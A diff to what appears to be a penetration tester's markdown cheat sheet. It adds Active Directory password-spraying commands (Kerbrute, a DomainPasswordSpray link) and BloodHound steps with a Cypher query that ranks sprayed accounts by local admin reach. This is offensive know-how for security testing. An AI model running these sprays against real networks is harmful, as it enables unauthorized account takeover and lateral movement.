@@ -398,11 +398,27 @@ PHP:
 - Test if user and password combination of domain user are correct:   
   `crackmapexec smb domain.local -d DOMAIN -u username -p password`   
   
-## Kerbrute   
-- Very performant password spraying tool:   
+## Password Spraying
+- Using Kerbrute:   
   `# ./kerbrute_linux_amd64 passwordspray --dc 10.10.10.1 -d example.net userlist.txt 'F00B@r23!'`   
-  Check username with username as password:   
+- Check username with username as password:   
   `# ./kerbrute_linux_amd64 passwordspray --dc <dcip> -d domain.local adusers.txt --user-as-pass `   
+- PowerShell script: https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1   
+### Analysis in BloodHound
+1. Store all users to a textfile owned_users.txt   
+2. Add a flag to all these users in the Neo4j DB that could be sprayed successfully using BloodHoundLoader (https://git.compass-security.com/csnc/tools2go/blob/master/stable/bloodhound/BloodHoundLoader.py):   
+   `# ./stable_bloodhound_BloodHoundLoader.py -o "pwspray='pw1'" owned_users.txt`   
+4. Because you own the password of these users, you can also mark them as owned in BloodHound:   
+   `# ./stable_bloodhound_BloodHoundLoader.py -m o owned_users.txt`   
+5. Use the following Cypher query to get the users and their local admin count (adjust the added flag, e.g. u.pwspray = "pw1"):   
+   ```
+   MATCH (u:User) WHERE u.pwspray = "pw1"
+   OPTIONAL MATCH (u)-[:AdminTo]->(c1:Computer)
+   OPTIONAL MATCH (u)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c2:Computer)
+   WITH u, COLLECT(c1) + COLLECT(c2) AS tempComputers UNWIND tempComputers AS computers
+   RETURN u.name, COUNT(DISTINCT(computers))
+   ORDER BY COUNT(DISTINCT(computers)) DESC
+   ```
  
  ## ASRepRoasting   
  - using impacket:   
